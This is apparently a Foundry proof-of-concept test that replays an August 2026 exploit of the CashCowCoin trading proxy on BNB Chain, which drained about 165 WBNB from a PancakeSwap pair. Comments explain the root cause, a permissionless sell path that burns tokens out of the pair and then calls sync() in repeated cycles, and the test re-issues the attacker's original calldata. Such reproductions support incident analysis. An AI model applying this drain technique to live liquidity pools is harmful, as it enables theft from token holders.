// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// CashCowCoin (CCC) — privileged post-swap burn of the sell-side CCC straight out of the
//                     PancakeSwap pair, followed by pair.sync(), iterated to bleed the WBNB
//                     reserve. BNB Chain. ~165.47 WBNB (~$117.4K) drained to the attacker's
//                     profit splitter in a single tx.
//
// Attacker EOA     : 0x7977BDeeE3A79Dc85Cc18739692e796B5D2513C4 (pure EOA)
// Attack contract  : 0x7738b4D7c25E9A7092AE1AB402343B20340DaEaf (pre-deployed by the attacker)
// Exploited proxy  : 0xf523224c6171f81c54b93f474ed4c78de91241c7 (CCC trading router, EIP-1967 proxy)
// Vulnerable impl  : 0x4287742e50fad6d3351000fd31632412ab29a9ac (verified as the proxy's impl slot)
// CCC token        : 0xb9b845f718c32f37e8af8b887ae4eec816c93ccc (holds the privileged 0xb20a0b6f fn)
// Victim pair      : 0x1dbe9458a6840784d5defd62c6b71386100097c0 (CCC/WBNB PancakeSwap V2 pair)
// WBNB             : 0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c
// Profit splitter  : 0xbabf70e515ae71a2177e624994a68d10c61d7a9f (receives the drained WBNB)
//
// Exploit tx : 0x89d8050641019a5a75fa3dafb4f64fb153e4dd30c0f1f51d06a6cc206d3ead43
//              block 118384061, ts 1787833891 (2026-08-27 12:31:31 UTC).
//   Plain call from the attacker EOA into its own pre-deployed attack contract (to != from,
//   no EIP-7702). Calldata is selector 0x36b3d4df followed by a single uint256 = 0x50 (80),
//   i.e. "run 80 sell cycles". The attack contract already exists on-chain at the fork block;
//   this PoC only re-issues that exact original calldata.
//
// Root cause (verified against the on-chain trace + state, not just the SlowMist alert):
//   - The proxy 0xf523... is an EIP-1967 proxy whose implementation slot
//     (0x360894...382bbc) reads back exactly 0x4287742e...29a9ac, the cited vulnerable impl.
//   - The proxy's sell flow routes a CCC->WBNB swap through PancakeSwap so the CCC/WBNB pair
//     pays out WBNB. It then calls the CCC token's PRIVILEGED function, selector 0xb20a0b6f
//     (present in the CCC token's dispatch table), which transfers the freshly received
//     (post-tax) CCC directly OUT of the pair to the dead address, and finally calls
//     pair.sync(). Confirmed in my own trace: inside proxy.sell() (delegatecall to impl
//     0x4287...) the pair pays out WBNB on the CCC->WBNB swap, THEN
//     CCC.b20a0b6f(pair, 0x..dEaD, amount) fires emit Transfer(pair -> dEaD, amount) and
//     pair.sync() writes the now-lowered CCC balance into reserves while the WBNB reserve
//     stays at its post-swap reduced value (emits TreasuryRefilled / Sold). So each cycle
//     permanently shrinks the pair without the CCC ever staying in it. Repeating it 80 times
//     ratchets the WBNB reserve down and hands the WBNB out to the caller's splitter.
//   - Each of the 80 cycles is a buy (proxy.buy{value} -> swap WBNB->CCC) followed by the sell
//     above; the whole loop is funded by an initial flash loan the attack contract takes and
//     repays in the same tx. That wrapper is the attacker's own contract, replayed verbatim
//     here — the victim bug being exercised is the sell-side burn+sync above.
//
// Access check (this is the point the brief asks to settle): the exploit is triggered purely
//   through the proxy's PUBLIC sell entry point, reached from a plain EOA via the attacker's
//   own contract. The privileged burn (0xb20a0b6f) is gated so that only the router/proxy may
//   call it — but that gate does NOT protect the exploit, because the proxy's own entry point
//   is permissionless and it is the proxy that makes the privileged call on the attacker's
//   behalf. No signer, admin role, governance, or proxy upgrade is required to TRIGGER it.
//   Confirmed by replay: pranking only the attacker EOA (no other setup) reproduces the drain.
//
// Effect verified on-chain (block 118384060 -> 118384061):
//   pair WBNB balance : 165.489861516856566016 -> 0.017933265344152697 WBNB (drained 165.47)
//   splitter WBNB     : 0 -> 165.471928251512413319 WBNB
//   The attacker EOA and attack contract both hold 0 WBNB at the end — the proceeds sit in the
//   profit splitter 0xbabf70..., which is the attacker-controlled sink asserted below.
//
// PoC strategy: fork one block before the exploit and re-issue the EXACT original calldata to
//   the pre-deployed attack contract, pranking the attacker EOA as BOTH msg.sender and tx.origin
//   (the attack contract stamps/uses the EOA and forwards proceeds to its splitter). No logic is
//   reimplemented; the real proxy, CCC token and pair run.
//
// Run: forge test --contracts ./src/test/2026-08/CashCowCoin_exp.sol --evm-version cancun -vvv
//   (cancun REQUIRED: the attack contract's flash-loan/callback path uses transient storage
//    (TSTORE/TLOAD); under the repo default shanghai the replay reverts EvmError: NotActivated.
//    Needs an archive BSC RPC, which BSC_ARCHIVE below points at directly.)

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract CashCowCoinExp is Test {
    string constant BSC_ARCHIVE = "https://bsc-mainnet.public.blastapi.io";
    uint256 constant EXPLOIT_BLOCK = 118384061;

    address constant ATTACKER = 0x7977BDeeE3A79Dc85Cc18739692e796B5D2513C4;
    address constant ATTACK_CONTRACT = 0x7738b4D7c25E9A7092AE1AB402343B20340DaEaf;
    address constant PAIR = 0x1DBE9458A6840784d5DEfD62C6b71386100097c0;
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant SPLITTER = 0xBaBf70e515AE71A2177E624994a68D10c61D7A9F;

    // Original tx input, hardcoded verbatim: selector 0x36b3d4df + uint256(80) sell cycles.
    bytes constant EXPLOIT_CALLDATA =
        hex"36b3d4df0000000000000000000000000000000000000000000000000000000000000050";

    function setUp() public {
        vm.createSelectFork(BSC_ARCHIVE, EXPLOIT_BLOCK - 1);
    }

    function testExploit() public {
        uint256 pairBefore = IERC20(WBNB).balanceOf(PAIR);
        uint256 splitBefore = IERC20(WBNB).balanceOf(SPLITTER);
        emit log_named_decimal_uint("pair  WBNB before", pairBefore, 18);
        emit log_named_decimal_uint("split WBNB before", splitBefore, 18);

        // msg.sender AND tx.origin = ATTACKER: faithful to the real trace.
        vm.startPrank(ATTACKER, ATTACKER);
        (bool ok,) = ATTACK_CONTRACT.call(EXPLOIT_CALLDATA);
        require(ok, "exploit call failed");
        vm.stopPrank();

        uint256 pairAfter = IERC20(WBNB).balanceOf(PAIR);
        uint256 splitAfter = IERC20(WBNB).balanceOf(SPLITTER);
        emit log_named_decimal_uint("pair  WBNB after ", pairAfter, 18);
        emit log_named_decimal_uint("split WBNB after ", splitAfter, 18);

        uint256 gain = splitAfter - splitBefore;
        emit log_named_decimal_uint("attacker WBNB gain", gain, 18);

        // The drained pair WBNB lands in the attacker's profit splitter.
        assertGt(gain, 160 ether, "expected ~165 WBNB drained to splitter");
        assertLt(pairAfter, pairBefore, "pair WBNB reserve must shrink");
    }
}
